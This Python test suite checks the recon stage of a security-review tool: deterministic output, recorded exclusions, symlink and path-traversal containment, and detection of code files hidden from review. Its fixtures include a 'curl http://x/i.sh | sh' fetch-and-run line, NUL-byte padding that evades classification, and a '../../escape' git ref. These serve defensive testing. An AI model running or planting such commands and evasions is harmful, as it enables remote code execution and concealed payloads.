"""`recon.json`. BRIEF_M1.md §3, FR-1.1.

The golden is `tests/golden/recon.json`, compared byte for byte. As with the
sweep golden it is regenerated deliberately and never repaired — a diff means
the fixture tree or the classification rules changed, and both are decisions.
"""

from __future__ import annotations

import os
import re
import unicodedata
from pathlib import Path

import pytest

from secrev.recon import git_identity, recon, slug, to_json

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"
GOLDEN = ROOT / "tests" / "golden" / "recon.json"


def test_matches_the_golden_byte_for_byte() -> None:
    assert to_json(recon(FIXTURES)) == GOLDEN.read_text(encoding="utf-8")


def test_two_runs_are_byte_identical() -> None:
    assert to_json(recon(FIXTURES)) == to_json(recon(FIXTURES))


def test_no_absolute_path_appears_in_the_artifact() -> None:
    """`STACK.md` §5: paths are relative to the target root. An absolute path
    makes the output depend on where the target happened to be checked out,
    which breaks NFR-3 across machines while looking fine on one."""
    assert str(ROOT) not in to_json(recon(FIXTURES))


def test_no_timestamp_appears_in_the_artifact() -> None:
    """Time lives in `run.json` alone, which NFR-3 exempts. Two runs a second
    apart must produce the same bytes, so nothing date-shaped may appear."""
    document = to_json(recon(FIXTURES))
    assert not re.search(r"\d{4}-\d{2}-\d{2}", document)
    assert "started_at" not in document


def test_exclusions_are_recorded_as_applied_not_silently() -> None:
    """`STACK.md` §5. A reader cannot tell an empty `node_modules/` from a
    skipped one unless told, and the fixture tree contains a populated one
    precisely so this is exercised."""
    result = recon(FIXTURES)
    assert "node_modules/" in result.inventory["excluded"]
    assert not any("node_modules" in path for path in result.inventory["binary"])


def test_excluded_names_what_was_skipped_not_what_could_be() -> None:
    """M3.5 A1. `recon.json` reported `EXCLUDED_DIRS` — the fourteen names the
    tool *could* skip — rather than the ones it actually skipped.

    So the field answered the wrong question. `STACK.md` §5 requires exclusions
    "recorded in `recon.json` as exclusions applied, not silently", and the
    whole value of recording them is telling a skipped `dist/` from an absent
    one. Listing all fourteen unconditionally tells you neither.

    The test directly above passed throughout, which is why this one exists:
    `"node_modules/" in excluded` was true whether or not the directory was
    there, so it asserted the constant rather than the behaviour. That is the
    third check in this milestone found green for a reason unrelated to its
    claim, after `excerpt()`'s ordering and `recon.json`'s `unreadable` key.
    """
    excluded = recon(FIXTURES).inventory["excluded"]
    assert "node_modules/" in excluded
    # Absent from the fixture tree, and therefore absent from the report.
    # Before the fix every one of these was listed unconditionally.
    assert "dist/" not in excluded
    assert ".venv/" not in excluded
    assert ".tox/" not in excluded


def test_a_tree_with_dist_and_one_without_report_differently(tmp_path: Path) -> None:
    """A1's stated evidence, and the distinction the field exists to make.

    `dist/` is the sharp case: it is this project's build output and a target's
    *shipped artifact*. A reviewer who cannot tell "there was no `dist/`" from
    "there was one and I skipped it" has been handed a silent gap in exactly
    the directory most likely to hold what ships.
    """
    plain = tmp_path / "plain"
    (plain / "pkg").mkdir(parents=True)
    (plain / "pkg" / "app.py").write_text("x = 1\n", encoding="utf-8")

    shipped = tmp_path / "shipped"
    (shipped / "pkg").mkdir(parents=True)
    (shipped / "pkg" / "app.py").write_text("x = 1\n", encoding="utf-8")
    (shipped / "dist").mkdir()
    (shipped / "dist" / "bundle.js").write_text("var x = 1;\n", encoding="utf-8")

    assert recon(plain).inventory["excluded"] == []
    assert recon(shipped).inventory["excluded"] == ["dist/"]

    # And it really was skipped, rather than merely reported: the bundle is not
    # in the inventory. The report and the walk have to agree, or the field is
    # a claim about something other than what happened.
    assert recon(shipped).inventory["files_total"] == 1


def test_binary_is_detected_by_content_and_listed() -> None:
    result = recon(FIXTURES)
    assert result.inventory["binary"] == ["assets/blob.bin"]


def test_an_unreadable_file_is_listed_rather_than_omitted(tmp_path: Path) -> None:
    """M3.5 C2, and this assertion is the point rather than the golden.

    The committed golden carries `"unreadable": []`, which asserts nothing
    about the field: an empty list is what you get whether the code populates
    it or not. A golden alone would stay green if the key were deleted and the
    golden regenerated, which is exactly how a check stops checking.

    FR-3.8 is what the field serves — degrade honestly rather than pass over
    what is not covered. A file absent from every list in `recon.json` reads as
    reviewed and clean, and that is the one thing it is not.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "open.py").write_text("x = 1\n", encoding="utf-8")
    blocked = target / "locked.py"
    blocked.write_text("y = 2\n", encoding="utf-8")
    blocked.chmod(0o000)

    try:
        blocked.read_bytes()
    except PermissionError:
        pass
    else:  # pragma: no cover - running as root ignores the mode
        blocked.chmod(0o644)
        pytest.skip("this user ignores file modes, so the file is not unreadable")

    try:
        result = recon(target)
    finally:
        blocked.chmod(0o644)

    assert result.inventory["unreadable"] == ["locked.py"]
    # Still inventoried. The file exists, and `files_total` is a count of what
    # is there, not of what could be read.
    assert result.inventory["files_total"] == 2
    # But not claimed as Python, and its lines are not in `loc_total`: the
    # extension is the only thing this tool ever saw of it, and counting lines
    # it never read would be a number with nothing behind it.
    assert result.inventory["by_language"] == {"python": 1}
    assert result.inventory["loc_total"] == 1


def test_a_fifo_is_listed_as_not_a_regular_file(tmp_path: Path) -> None:
    """M3.5 C1's second half: the run completes *and records the path*.

    The committed golden carries `"not_regular": []`, which asserts nothing —
    an empty list is what you get whether the code populates it or not. Left to
    the golden alone, deleting the key and regenerating would stay green. That
    failure mode has now appeared five times in this milestone, so the
    behaviour is asserted directly every time a field is added.

    Listed apart from `unreadable` because they are different facts. One is a
    permission a reviewer might be able to change; the other is a thing with no
    content to review at all. Reporting a FIFO as "unreadable" would send
    someone to check file modes that were never the problem.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        os.mkfifo(target / "pipe")
    except (AttributeError, OSError):  # pragma: no cover - platform-dependent
        pytest.skip("this platform or filesystem does not support FIFOs")

    result = recon(target)

    assert result.inventory["not_regular"] == ["pipe"]
    assert result.inventory["unreadable"] == []
    # Inventoried: it is present, and `files_total` counts what is there.
    assert result.inventory["files_total"] == 2
    # But it contributes no lines and no language, because it has no content
    # and the extension is the only thing we ever saw of it.
    assert result.inventory["loc_total"] == 1
    assert result.inventory["by_language"] == {"python": 1}


def test_a_file_over_the_size_bound_is_listed_as_too_large(tmp_path: Path) -> None:
    """`STACK.md` §5: skipping is recorded, never silent.

    A size cap that quietly dropped a file would recreate exactly the evasion
    A3 and C1 closed — a file absent from every list in this artifact reads as
    reviewed and clean.

    The three "present but not read" facts are asserted apart from each other
    on purpose. They are different problems with different remedies: a mode the
    reviewer might change, a thing with no content to read, and a threshold
    they can raise with `--max-file-bytes`.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "small.py").write_text("x = 1\n", encoding="utf-8")
    (target / "big.py").write_text("y = 2\n" * 100, encoding="utf-8")

    result = recon(target, max_bytes=200)

    assert result.inventory["too_large"] == ["big.py"]
    assert result.inventory["unreadable"] == []
    assert result.inventory["not_regular"] == []

    # Inventoried, because it is there — but contributing no lines and no
    # language, because nothing was read.
    assert result.inventory["files_total"] == 2
    assert result.inventory["loc_total"] == 1
    assert result.inventory["by_language"] == {"python": 1}


# --- M3.5 D1: the tool reads nothing outside the target it was pointed at --
#
# `inventory.walk` has never followed a symlink. `recon.py` reaches for four
# named files directly, outside the walk, and each reach uses `is_file()` or
# `is_dir()` — both of which follow symlinks. So containment held for every
# file the tool discovered and failed for every file it went looking for.


def test_a_manifest_symlinked_outside_the_target_is_not_read(tmp_path: Path) -> None:
    """D1. `_entrypoints` calls `pyproject.is_file()`, and `is_file()` follows
    the link — so a target shipping `pyproject.toml` as a symlink had a file
    elsewhere on the machine read, parsed, and its contents copied into
    `recon.json`.

    G-4 says third-party artifacts stay untouched and the review stays inside
    the target; P9 makes a link leaving the closure a question rather than a
    path to chase. The leak is quiet: the entry points simply appear, and
    nothing in the artifact says where they came from.
    """
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "real.toml").write_text(
        '[project.scripts]\nleaked = "private.cli:main"\n', encoding="utf-8"
    )

    target = tmp_path / "target"
    target.mkdir()
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        (target / "pyproject.toml").symlink_to(outside / "real.toml")
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    declared = recon(target).entrypoints["declared"]
    assert declared == [], f"read through a symlink leaving the target: {declared}"


def test_a_package_json_symlinked_outside_the_target_is_not_read(tmp_path: Path) -> None:
    """The same breach by the other manifest. Both are reached by name rather
    than found by the walk, so both bypass the containment the walk provides."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "real.json").write_text('{"bin": {"leaked": "./private.js"}}\n', encoding="utf-8")

    target = tmp_path / "target"
    target.mkdir()
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        (target / "package.json").symlink_to(outside / "real.json")
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    declared = recon(target).entrypoints["declared"]
    assert declared == [], f"read through a symlink leaving the target: {declared}"


# --- the same class, at the five sites D1 did not reach ------------------
#
# D1 added `and not ...is_symlink()` at each of the four sites a review had
# demonstrated. A second review walked through five more, because the class is
# *reaching by name* and a per-site patch cannot close it: every field that
# looks a file up is a new hole, and the check has to be remembered rather than
# inherited. Those fields now come from `_found_paths`, which is what the walk
# found, so a site that forgets to use it fails closed.


def _linked_target(tmp_path: Path, name: str, outside_body: str, outside_name: str) -> Path:
    """A target whose `name` is a symlink to a file outside it."""
    outside = tmp_path / "outside"
    outside.mkdir(exist_ok=True)
    (outside / outside_name).write_text(outside_body, encoding="utf-8")

    target = tmp_path / "target"
    target.mkdir(exist_ok=True)
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    link = target / name
    link.parent.mkdir(parents=True, exist_ok=True)
    try:
        link.symlink_to(outside / outside_name)
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")
    return target


def test_a_symlinked_security_policy_is_not_claimed_as_the_targets(tmp_path: Path) -> None:
    """`security_md` was `(root / "SECURITY.md").is_file()`, and `is_file()`
    follows the link — so `SECURITY.md -> /etc/passwd` reported that a target
    with no security policy had one. A claim about someone else's filesystem,
    presented as a property of this tree."""
    target = _linked_target(tmp_path, "SECURITY.md", "# theirs\n", "real.md")
    assert recon(target).security_process["security_md"] is False


def test_a_symlinked_dependabot_config_is_not_claimed(tmp_path: Path) -> None:
    """The same shape, and the site the review did not name — which is the
    point: the class produces sites faster than a reviewer names them."""
    target = _linked_target(tmp_path, ".github/dependabot.yml", "version: 2\n", "real.yml")
    assert recon(target).security_process["dependabot"] is False


def test_a_symlinked_sast_config_is_not_claimed(tmp_path: Path) -> None:
    """And the fifth. `_SAST_CONFIG` was checked with a bare `is_file()` in a
    generator expression, which is the easiest place of all for a symlink test
    to be left out."""
    target = _linked_target(tmp_path, ".semgrep.yml", "rules: []\n", "real.yml")
    assert recon(target).security_process["sast_config"] is False


def test_workflows_are_not_read_through_a_symlinked_github_directory(tmp_path: Path) -> None:
    """`Path.glob` follows a symlinked directory, so `.github -> /somewhere`
    copied a foreign directory's workflow filenames into `recon.json` under this
    target's name — reported in a field a reader takes as a statement about the
    tree in front of them."""
    outside = tmp_path / "outside"
    (outside / "workflows").mkdir(parents=True)
    (outside / "workflows" / "secret-deploy.yml").write_text("on: push\n", encoding="utf-8")

    target = tmp_path / "target"
    target.mkdir()
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        (target / ".github").symlink_to(outside, target_is_directory=True)
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    workflows = recon(target).entrypoints["workflows"]
    assert workflows == [], f"globbed through a symlinked directory: {workflows}"


def test_a_ref_reached_through_a_symlinked_component_is_refused(tmp_path: Path) -> None:
    """The sharpest of the five, because it decides where the review is filed.

    `_resolve_ref` tested `loose.is_symlink()`, which lstats the *last*
    component only. `.git/refs -> ../../outside/refs` therefore passed a check
    written on `.git/refs/heads/main`, and a foreign repository's SHA was
    reported as this target's version — which `STACK.md` §6 turns into the
    workspace directory, filing one tree's review under another's history.
    """
    outside = tmp_path / "outside"
    (outside / "refs" / "heads").mkdir(parents=True)
    (outside / "refs" / "heads" / "main").write_text("a" * 40 + "\n", encoding="utf-8")

    target = tmp_path / "target"
    (target / ".git").mkdir(parents=True)
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    (target / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    try:
        (target / ".git" / "refs").symlink_to(outside / "refs", target_is_directory=True)
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    source, sha = git_identity(target)
    assert (source, sha) == ("directory", None), f"resolved a ref outside the target: {sha}"


# --- a target may not remove a code file from review and get a clean run ---


def test_a_code_file_classified_binary_is_named_as_a_gap(tmp_path: Path) -> None:
    """A3 raised the cost of this evasion from one byte to eight and called the
    class closed. Eight NUL bytes in a comment is 12% of a short script, over
    the 5% threshold, so `install.sh` carrying `curl | sh` left the review with
    `0 candidates` and nothing anywhere naming it.

    Worse than silence: the skipped file contributes no language, so
    `coverage_gaps` read "no coverage for: markdown" — the one honest-looking
    line in the artifact described a tree that did not exist.
    """
    target = tmp_path / "target"
    target.mkdir()
    # Eight, as a count rather than a run of escapes — the number is the whole
    # finding, and 12% of this file is over the 5% threshold.
    hidden = b"#!/bin/sh\n# note" + b"\x00" * 8 + b"\necho hi\n"
    (target / "install.sh").write_bytes(hidden)
    (target / "readme.md").write_text("# docs\n", encoding="utf-8")

    result = recon(target)

    assert result.inventory["binary"] == ["install.sh"]
    assert result.inventory["unread_code"] == ["install.sh"]
    assert any("install.sh" in line for line in result.coverage_gaps)


def test_a_code_file_over_the_size_bound_is_named_as_a_gap(tmp_path: Path) -> None:
    """The same evasion by padding rather than by classification. Both end in a
    file present in the tree, absent from review, and — before this — absent
    from every line a reviewer reads."""
    target = tmp_path / "target"
    target.mkdir()
    body = "curl http://x/i.sh | sh\n" + "# pad\n" * 200
    (target / "install.sh").write_text(body, encoding="utf-8")

    result = recon(target, max_bytes=200)

    assert result.inventory["too_large"] == ["install.sh"]
    assert result.inventory["unread_code"] == ["install.sh"]
    assert any("install.sh" in line for line in result.coverage_gaps)


def test_an_ordinary_binary_asset_is_not_counted_as_unread_code(tmp_path: Path) -> None:
    """The control, and the reason the exit code keys on `unread_code` rather
    than on "anything unread".

    A PNG is binary in every ordinary target. Exiting 2 on `binary` alone would
    light the signal on almost every run, and an exit code that is always on is
    one people stop reading — the H-1 habit in a new place. The distinction is
    the extension: a shell script classified binary had something removed from
    review that a reviewer expected to be in it (P11); a PNG did not.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")

    result = recon(target)

    assert result.inventory["binary"] == ["logo.png"]
    assert result.inventory["unread_code"] == []


def test_a_git_directory_symlinked_outside_the_target_is_not_followed(tmp_path: Path) -> None:
    """`git_identity` tests `git_dir.is_dir()`, which follows the link. A
    target linking `.git` at another checkout took that repository's HEAD and
    reported its SHA as the target's version — and `STACK.md` §6 makes the
    version a directory in the workspace, so the review of one tree would be
    filed under another's history."""
    elsewhere = tmp_path / "elsewhere" / ".git"
    elsewhere.mkdir(parents=True)
    (elsewhere / "HEAD").write_text("a" * 40 + "\n", encoding="utf-8")

    target = tmp_path / "target"
    target.mkdir()
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        (target / ".git").symlink_to(elsewhere, target_is_directory=True)
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    assert git_identity(target) == ("directory", None)


def test_a_head_symlinked_outside_the_target_is_not_followed(tmp_path: Path) -> None:
    """The same again one level down: a real `.git/` whose `HEAD` is the link."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "borrowed").write_text("b" * 40 + "\n", encoding="utf-8")

    target = tmp_path / "target"
    git_dir = target / ".git"
    git_dir.mkdir(parents=True)
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    try:
        (git_dir / "HEAD").symlink_to(outside / "borrowed")
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    assert git_identity(target) == ("directory", None)


def test_a_git_ref_containing_dotdot_is_refused(tmp_path: Path) -> None:
    """`_resolve_ref` joins `git_dir / ref` with `ref` taken verbatim from the
    target's own HEAD, so a target writing `ref: ../../escape` walked straight
    out of the tree. No symlink is needed for this one — the target supplies
    the path directly, which makes it the sharpest of the four.

    `path.traversal` is a rule this tool ships. Being vulnerable to it is the
    self-application failure AC-10 exists to prevent.
    """
    target = tmp_path / "target"
    git_dir = target / ".git"
    git_dir.mkdir(parents=True)
    (git_dir / "HEAD").write_text("ref: ../../escape\n", encoding="utf-8")
    (tmp_path / "escape").write_text("c" * 40 + "\n", encoding="utf-8")

    assert git_identity(target) == ("directory", None)


def test_binary_files_are_not_counted_as_a_language() -> None:
    result = recon(FIXTURES)
    assert sum(result.inventory["by_language"].values()) < result.inventory["files_total"]


def test_coverage_gaps_state_what_is_not_done() -> None:
    """FR-3.8: degrade honestly. §3's example implies structural analysis
    exists for some languages; it exists for none until M4, and saying "no
    coverage for yaml, markdown" would understate the gap by implying the rest
    were covered. The surface source exists now, so the line that said it did
    not is gone (BRIEF_M2.md §4) — a gap that is no longer true misleads as
    surely as a missing one."""
    gaps = recon(FIXTURES).coverage_gaps
    assert any("structural analysis not implemented" in gap for gap in gaps)
    assert not any("surface enumeration not implemented" in gap for gap in gaps)


@pytest.mark.parametrize(
    "unreachable",
    [
        "HTTP routes",
        "IPC handlers",
        "argument parser",
        "no `__all__`",
        "built at runtime",
        "split across lines",
        "several on one line",
        "frontmatter",
        "setup.cfg",
    ],
)
def test_coverage_gaps_name_what_the_surface_source_cannot_reach(unreachable: str) -> None:
    """BRIEF_M2.md §4 names HTTP routes and IPC handlers. The rest are the
    line-oriented limits the owner accepted in TASKS_M2.md on the condition
    that each is named somewhere a reader will see it, rather than left
    implicit in a regex."""
    assert any(unreachable in gap for gap in recon(FIXTURES).coverage_gaps)


def test_other_code_languages_are_named(tmp_path: Path) -> None:
    """Surface kinds read code in Python only (STACK.md §7). A tree holding
    other code has entry points no kind can see, and the gap names the
    languages, as the structural line does."""
    (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "server.ts").write_text("export const x = 1\n", encoding="utf-8")
    (tmp_path / "run.sh").write_text("echo hi\n", encoding="utf-8")
    [line] = [gap for gap in recon(tmp_path).coverage_gaps if "Python only" in gap]
    assert line.endswith("not read for: shell, typescript")


def test_a_python_only_tree_says_so() -> None:
    [line] = [gap for gap in recon(FIXTURES).coverage_gaps if "Python only" in gap]
    assert line.endswith("no other code language present")


def test_entrypoints_are_declared_metadata_only(tmp_path: Path) -> None:
    """§3: "Deeper enumeration is M2's job; do not attempt it here."""
    (tmp_path / "pyproject.toml").write_text(
        '[project.scripts]\ndemo = "demo.cli:main"\n', encoding="utf-8"
    )
    (tmp_path / "app.py").write_text("def main():\n    pass\n", encoding="utf-8")
    result = recon(tmp_path)
    assert result.entrypoints["declared"] == ["demo = demo.cli:main"]


def test_a_malformed_manifest_does_not_crash_the_run(tmp_path: Path) -> None:
    """A target's manifest is untrusted input like everything else in it. An
    unparseable one means "no declared entry points found", not a traceback —
    the tool has to survive reviewing a broken artifact."""
    (tmp_path / "pyproject.toml").write_text("[project.scripts\nbroken", encoding="utf-8")
    assert recon(tmp_path).entrypoints["declared"] == []


def test_git_identity_reads_a_real_checkout() -> None:
    """This repository is one, so the assertion has a real subject."""
    source, sha = git_identity(ROOT)
    assert source == "git"
    assert sha is not None
    assert len(sha) == 40


def test_git_identity_degrades_rather_than_guesses(tmp_path: Path) -> None:
    """A tree that is not a checkout yields a true statement instead of an
    inferred version. `version` becomes part of the workspace path, and a
    fabricated one splits a single target's history across two directories
    that never reconcile."""
    assert git_identity(tmp_path) == ("directory", None)
    result = recon(tmp_path)
    assert result.target["version"] == "unversioned"
    assert result.target["sha"] is None


def test_git_identity_does_not_follow_a_worktree_pointer(tmp_path: Path) -> None:
    """`.git` as a file points outside the target. P9 makes leaving the tree a
    question rather than a path to chase silently."""
    (tmp_path / ".git").write_text("gitdir: /elsewhere/.git/worktrees/x\n", encoding="utf-8")
    assert git_identity(tmp_path) == ("directory", None)


def test_slug_is_stable_across_unicode_forms() -> None:
    """The slug is a directory name in the workspace, so it must be the same
    string whether the filesystem handed back NFC or NFD.

    Both inputs are built with `unicodedata` rather than typed as literals. A
    source file holds exactly one normalisation, so a literal-versus-literal
    comparison here would compare a string to itself and pass no matter what
    `slug` did — which is precisely the defect the assertion is about.
    """
    composed = unicodedata.normalize("NFC", "Caf\u00e9 Project")
    decomposed = unicodedata.normalize("NFD", "Caf\u00e9 Project")
    assert composed != decomposed
    assert slug(composed) == slug(decomposed) == "cafe-project"


def test_slug_collapses_and_trims_separators() -> None:
    assert slug("My Target!!") == "my-target"
    assert slug("...") == "target"
